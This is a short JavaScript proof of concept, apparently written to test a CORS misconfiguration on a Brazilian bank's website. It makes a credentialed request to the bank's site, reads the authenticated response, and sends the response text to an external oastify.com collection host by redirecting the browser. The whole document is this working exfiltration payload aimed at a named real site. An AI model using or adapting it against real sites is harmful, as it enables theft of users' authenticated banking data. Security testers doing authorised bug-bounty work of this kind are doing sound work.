var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://www.c6bank.com.br/',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//zz2sk6ie03p9dp0neu35zt282z8qwjk8.oastify.com/log?key='+this.responseText; 
};
